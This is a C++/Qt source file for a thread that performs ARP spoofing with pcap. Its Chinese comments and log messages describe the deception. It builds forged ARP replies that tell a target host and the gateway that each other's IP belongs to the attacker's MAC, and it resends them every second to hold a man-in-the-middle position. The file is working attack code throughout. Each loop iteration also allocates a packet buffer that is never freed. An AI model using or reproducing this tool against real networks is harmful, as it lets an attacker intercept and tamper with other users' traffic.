#include "sendthread.h"
#include <QString>

SendThread::SendThread(pcap_t *_adhandle, u_char *_currentMac, u_long _targetIp, u_char *_targetMac, u_long _gateIp, u_char *_gateMac):\
    isStopped(false), adhandle(_adhandle), currentMac(_currentMac), targetIp(_targetIp), targetMac(_targetMac), gateIp(_gateIp), gateMac(_gateMac)
{
    fakeTargetArpPkt = BuildArpPacket(currentMac, gateIp, targetMac, targetIp);
    fakeGateArpPkt = BuildArpPacket(currentMac, targetIp, gateMac, gateIp);
}

void SendThread::stop()
{
    QMutexLocker locker(&mlock);
    isStopped = true;
}

void SendThread::run()
{
    while(isStopped != true)
    {
        //构建欺骗目标主机的arp数据包,源IP为网关IP
        fakeTargetArpPkt = BuildArpPacket(currentMac, gateIp, targetMac, targetIp);
        if(pcap_sendpacket(adhandle, fakeTargetArpPkt, 42) == -1)
        {
            emit sendLogMsg("向目标主机发送ARP欺骗报文失败!");
        }
        else
        {
            emit sendLogMsg("向目标主机发送ARP欺骗报文成功!");
        }
        //构建欺骗网关的arp数据包，源IP为受害主机的IP
        fakeGateArpPkt = BuildArpPacket(currentMac, targetIp, gateMac, gateIp);
        if(pcap_sendpacket(adhandle, fakeGateArpPkt, 42) == -1)
        {
            emit sendLogMsg("向目标网关发送ARP欺骗报文失败!");
        }
        else
        {
            emit sendLogMsg("向目标网关发送ARP欺骗报文成功!");
        }
        Sleep(1000);
    }
    emit sendLogMsg("结束ARP欺骗!");
}

u_char* SendThread::BuildArpPacket(u_char *srcMac, u_long fakeIP, u_char *targetMac, u_long targetIP)
{
    arp_packet packet;
    //设置目的MAC地址
    memcpy(packet.eth.dest_mac, targetMac, 6);
    //源MAC地址
    memcpy(packet.eth.src_mac, srcMac, 6);
    //上层协议为ARP协议
    packet.eth.eh_type = htons(0x0806);
    //硬件类型，Ethernet是0x0001
    packet.arp.hardware_type = htons(0x0001);
    //上层协议类型，IP为0x0800
    packet.arp.protocol_type = htons(0x0800);
    //硬件地址长度
    packet.arp.add_len = 0x06;
    //协议地址长度
    packet.arp.pro_len = 0x04;
    //操作，arp应答为2
    packet.arp.option = htons(0x0002);
    //源MAC地址
    memcpy(packet.arp.sour_addr, srcMac, 6);
    //源IP地址，即伪造的源IP地址
    packet.arp.sour_ip = fakeIP;
    //目的MAC地址
    memcpy(packet.arp.dest_addr, targetMac, 6);
    //目的IP地址
    packet.arp.dest_ip = targetIP;
    u_char* res = (u_char*)malloc(sizeof(packet));
    memcpy(res, &packet, sizeof(packet));
    return res;
}
